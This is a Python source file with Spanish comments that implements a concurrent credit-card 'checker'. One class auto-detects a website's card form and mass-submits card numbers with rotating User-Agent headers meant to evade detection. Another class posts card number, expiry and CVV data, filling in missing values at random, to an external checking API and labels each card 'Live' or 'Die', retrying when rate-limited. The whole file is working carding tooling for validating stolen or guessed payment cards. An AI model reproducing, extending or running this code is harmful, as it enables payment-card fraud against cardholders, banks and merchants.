import asyncio
import httpx
from bs4 import BeautifulSoup
import secrets
import logging
from .utils import logger

class AsyncCardChecker:
    """
    Validador asíncrono y concurrente de tarjetas que interactúa con portales 
    de validación web de forma altamente eficiente, adaptándose de forma 
    dinámica a la estructura del formulario de destino.
    """

    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0"
    ]

    def __init__(self, target_url: str, concurrency_limit: int = 5):
        """
        Inicializa el validador web asíncrono.

        Args:
            target_url (str): URL del portal validador (ej. https://example.com/checker).
            concurrency_limit (int): Número máximo de peticiones HTTP concurrentes.
        """
        self.target_url = target_url
        self.semaphore = asyncio.Semaphore(concurrency_limit)
        # Deshabilitar logs ruidosos de HTTPX para una consola limpia
        logging.getLogger("httpx").setLevel(logging.WARNING)

    def _get_random_headers(self) -> dict:
        """Genera cabeceras HTTP aleatorias para evadir sistemas de detección simples."""
        return {
            "User-Agent": secrets.choice(self.USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
            "Origin": "/".join(self.target_url.split("/")[:3]),
            "Referer": self.target_url,
            "Connection": "keep-alive"
        }

    async def _discover_form_structure(self, client: httpx.AsyncClient) -> dict:
        """
        Realiza un GET a la URL de validación y analiza el DOM para extraer
        automáticamente los campos del formulario, inputs de tarjetas y tokens CSRF.
        """
        headers = self._get_random_headers()
        response = await client.get(self.target_url, headers=headers, timeout=10.0)
        response.raise_for_status()

        soup = BeautifulSoup(response.text, "html.parser")
        
        # Intentamos obtener el elemento form
        form = soup.find("form")
        action = self.target_url
        if form and form.get("action"):
            action_url = form.get("action")
            if action_url.startswith("http"):
                action = action_url
            else:
                base = "/".join(self.target_url.split("/")[:3])
                if action_url.startswith("/"):
                    action = f"{base}{action_url}"
                else:
                    action = f"{self.target_url.rstrip('/')}/{action_url}"

        # Palabras clave asociadas al input de la tarjeta
        likely_names = ["cc", "card", "cardnumber", "cc_number", "card_number", "number", "card_num", "ccnum", "validate"]
        cc_input = None
        inputs = soup.find_all("input")

        # 1. Buscar input cuyo name o id coincida con palabras clave
        for inp in inputs:
            name = inp.get("name", "").lower()
            inp_id = inp.get("id", "").lower()
            inp_type = inp.get("type", "text").lower()

            if inp_type in ["text", "tel", "number"]:
                if any(kw in name or kw in inp_id for kw in likely_names):
                    cc_input = inp
                    break

        # 2. Alternativa: buscar el primer input de texto/tel disponible
        if not cc_input:
            for inp in inputs:
                inp_type = inp.get("type", "text").lower()
                if inp_type in ["text", "tel", "number"] and inp.get("name"):
                    cc_input = inp
                    break

        if not cc_input:
            raise ValueError("No se pudo identificar el campo de entrada de la tarjeta en el HTML.")

        cc_field_name = cc_input.get("name") or cc_input.get("id")

        # Extraer campos ocultos (CSRF, tokens, etc.)
        hidden_payload = {}
        for inp in inputs:
            inp_type = inp.get("type", "").lower()
            name = inp.get("name")
            value = inp.get("value", "")
            if inp_type == "hidden" and name:
                hidden_payload[name] = value

        # Buscar selectores comunes de contenedor de mensajes de validación
        message_element = soup.find(id=lambda x: x and any(kw in x.lower() for kw in ["message", "result", "status", "response", "error", "valid"]))
        if not message_element:
            message_element = soup.find(class_=lambda x: x and any(kw in x.lower() for kw in ["message", "result", "status", "response", "error", "valid"]))

        message_id = message_element.get("id") if message_element else None
        message_class = message_element.get("class")[0] if (message_element and message_element.get("class")) else None

        return {
            "action": action,
            "cc_field": cc_field_name,
            "hidden_fields": hidden_payload,
            "message_id": message_id,
            "message_class": message_class
        }

    async def check_single(self, client: httpx.AsyncClient, card_number: str, form_structure: dict) -> dict:
        """
        Envía una petición POST para validar un número de tarjeta individual.
        """
        async with self.semaphore:
            headers = self._get_random_headers()
            
            # Incorporar campos ocultos dinámicos y valor de tarjeta
            data = dict(form_structure["hidden_fields"])
            data[form_structure["cc_field"]] = card_number

            try:
                response = await client.post(
                    form_structure["action"],
                    data=data,
                    headers=headers,
                    timeout=10.0
                )

                if response.status_code != 200:
                    return {
                        "card": card_number,
                        "status": "error",
                        "message": f"Error HTTP {response.status_code}"
                    }

                soup = BeautifulSoup(response.text, "html.parser")
                message = ""

                # Buscar por ID de mensaje detectado previamente
                if form_structure["message_id"]:
                    msg_el = soup.find(id=form_structure["message_id"])
                    if msg_el:
                        message = msg_el.get_text().strip()

                # Buscar por clase de mensaje detectada previamente
                if not message and form_structure["message_class"]:
                    msg_el = soup.find(class_=form_structure["message_class"])
                    if msg_el:
                        message = msg_el.get_text().strip()

                # Caída de seguridad: buscar en el texto de elementos estándar
                if not message:
                    for tag in ["p", "span", "div", "h2", "h3"]:
                        for el in soup.find_all(tag):
                            el_txt = el.get_text().strip()
                            if any(kw in el_txt.lower() for kw in ["valid", "invalid", "correct", "error", "inválida", "válida"]):
                                message = el_txt
                                break
                        if message:
                            break

                if not message:
                    # Encontrar cualquier texto del cuerpo si no hay elementos etiquetados
                    message = "Respuesta recibida sin contenedor de estado explícito."

                # Analizar validez del contenido
                is_valid = any(kw in message.lower() for kw in ["valid", "correct", "válida", "ok", "exitoso", "true"]) \
                           and not any(kw in message.lower() for kw in ["invalid", "incorrect", "inválida", "error", "false"])

                return {
                    "card": card_number,
                    "status": "valid" if is_valid else "invalid",
                    "message": message
                }

            except httpx.RequestError as e:
                return {
                    "card": card_number,
                    "status": "error",
                    "message": f"Fallo de conexión ({type(e).__name__})"
                }

    async def check_batch(self, card_numbers: list[str], progress_callback = None) -> list[dict]:
        """
        Valida una lista de tarjetas en paralelo.
        """
        async with httpx.AsyncClient(follow_redirects=True) as client:
            try:
                print(f"[*] Conectando a {self.target_url}...")
                form_structure = await self._discover_form_structure(client)
                print(f"[+] Estructura identificada (Campo de envío: '{form_structure['cc_field']}')")
            except Exception as e:
                print(f"[!] No se pudo descubrir la estructura dinámica del sitio: {e}")
                print("[*] Aplicando configuración por defecto (campo 'cc', método POST)...")
                form_structure = {
                    "action": self.target_url,
                    "cc_field": "cc",
                    "hidden_fields": {},
                    "message_id": None,
                    "message_class": None
                }

            print(f"[*] Analizando {len(card_numbers)} tarjetas concurrentemente...")
            tasks = [self.check_single_with_retry(client, card, form_structure, progress_callback=progress_callback) for card in card_numbers]
            results = await asyncio.gather(*tasks)
            return results

    async def check_single_with_retry(self, client: httpx.AsyncClient, card_number: str, form_structure: dict, retries: int = 3, progress_callback = None) -> dict:
        """
        Envuelve check_single agregando un mecanismo de reintento automático con 
        retroceso exponencial cuando se encuentra saturación o caídas de red.
        """
        res = None
        for attempt in range(retries):
            res = await self.check_single(client, card_number, form_structure)
            if res["status"] != "error":
                break
            
            # Si el error no es de saturación de red o API limit, no reintentar
            if "429" not in res["message"] and "conexion" not in res["message"].lower():
                break
                
            wait_time = 2 ** (attempt + 1)
            logger.warning(f"Reintento {attempt + 1}/{retries} para {card_number} en {wait_time}s debido a error: {res['message']}")
            await asyncio.sleep(wait_time)
            
        if progress_callback:
            progress_callback()
        return res


class ChkrApiChecker:
    """
    Validador que interactúa con la API REST de https://api.chkr.cc/
    para realizar validaciones robustas y rápidas sin necesidad de scrapeo HTML.
    """

    API_URL = "https://api.chkr.cc/"

    def __init__(self, concurrency_limit: int = 5):
        """
        Inicializa el validador de la API.

        Args:
            concurrency_limit (int): Número máximo de peticiones HTTP concurrentes.
        """
        self.semaphore = asyncio.Semaphore(concurrency_limit)
        logging.getLogger("httpx").setLevel(logging.WARNING)

    @staticmethod
    def _format_card_data(card_entry: str) -> str:
        """
        Normaliza y completa los datos de la tarjeta al formato 'NÚMERO|MES|AÑO|CVV'.
        Si no se especifican los valores, se autogeneran de forma lógica y segura.
        """
        # Eliminar guiones y espacios en cada segmento
        parts = [p.strip().replace(" ", "").replace("-", "") for p in card_entry.split("|") if p.strip()]
        if not parts:
            raise ValueError("La entrada está vacía.")
            
        card_num = parts[0]
        
        # Validar mes (MM)
        if len(parts) > 1:
            month = parts[1]
            if len(month) == 1:
                month = f"0{month}"
        else:
            month = f"{secrets.randbelow(12) + 1:02d}"
            
        # Validar año (YYYY)
        if len(parts) > 2:
            year = parts[2]
            if len(year) == 2:
                year = f"20{year}"
        else:
            year = str(2026 + secrets.randbelow(7))
            
        # Validar CVV
        if len(parts) > 3:
            cvv = parts[3]
        else:
            cvv = f"{secrets.randbelow(900) + 100:03d}"
            
        return f"{card_num}|{month}|{year}|{cvv}"

    async def check_single(self, client: httpx.AsyncClient, card_entry: str) -> dict:
        """
        Valida una sola tarjeta contra el endpoint de la API.
        """
        async with self.semaphore:
            try:
                formatted_data = self._format_card_data(card_entry)
            except Exception as e:
                return {
                    "card": card_entry,
                    "status": "error",
                    "message": f"Formato inválido: {e}"
                }

            headers = {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
            payload = {"data": formatted_data}

            try:
                response = await client.post(
                    self.API_URL,
                    json=payload,
                    headers=headers,
                    timeout=12.0
                )

                if response.status_code != 200:
                    return {
                        "card": formatted_data,
                        "status": "error",
                        "message": f"API retornó estado HTTP {response.status_code}"
                    }

                res_json = response.json()
                
                # Extraer campos clave
                code = res_json.get("code")
                status_text = res_json.get("status", "Unknown")
                msg = res_json.get("message", "")
                card_details = res_json.get("card", {})
                
                bank = card_details.get("bank", "Desconocido")
                card_type = card_details.get("type", "Desconocido")
                category = card_details.get("category", "Desconocido")
                country = card_details.get("country", {}).get("name", "Desconocido")
                
                full_message = f"{status_text} | {msg} | Banco: {bank} ({card_type.upper()} {category.upper()}) | País: {country}"

                # Clasificar estado
                if code == 1:
                    status = "valid"      # Live
                elif code == 0:
                    status = "invalid"    # Die
                else:
                    status = "unknown"    # Unknown o error interno de API

                return {
                    "card": formatted_data,
                    "status": status,
                    "message": full_message,
                    "raw": res_json
                }

            except httpx.RequestError as e:
                return {
                    "card": formatted_data,
                    "status": "error",
                    "message": f"Error de red ({type(e).__name__})"
                }
            except ValueError:
                return {
                    "card": formatted_data,
                    "status": "error",
                    "message": "Respuesta no es un JSON válido"
                }

    async def check_batch(self, card_entries: list[str], progress_callback = None) -> list[dict]:
        """
        Valida una lista de tarjetas concurrentemente contra la API.
        """
        async with httpx.AsyncClient() as client:
            print(f"[*] Conectando con API chkr.cc...")
            print(f"[*] Validando concurrentemente {len(card_entries)} tarjetas en la API...")
            tasks = [self.check_single_with_retry(client, entry, progress_callback=progress_callback) for entry in card_entries]
            results = await asyncio.gather(*tasks)
            return results

    async def check_single_with_retry(self, client: httpx.AsyncClient, card_entry: str, retries: int = 3, progress_callback = None) -> dict:
        """
        Envuelve check_single agregando un mecanismo de reintento automático con
        retroceso exponencial (exponential backoff) ante límites de tasa (429) o fallas de red.
        """
        res = None
        for attempt in range(retries):
            res = await self.check_single(client, card_entry)
            if res["status"] != "error":
                break
                
            # Si el error no es por saturación o límites de cuota, no reintentar
            if "429" not in res["message"] and "red" not in res["message"].lower():
                break
                
            wait_time = 2 ** (attempt + 1)
            logger.warning(f"Reintento {attempt + 1}/{retries} para {card_entry} en API chkr.cc en {wait_time}s por: {res['message']}")
            await asyncio.sleep(wait_time)
            
        if progress_callback:
            progress_callback()
        return res

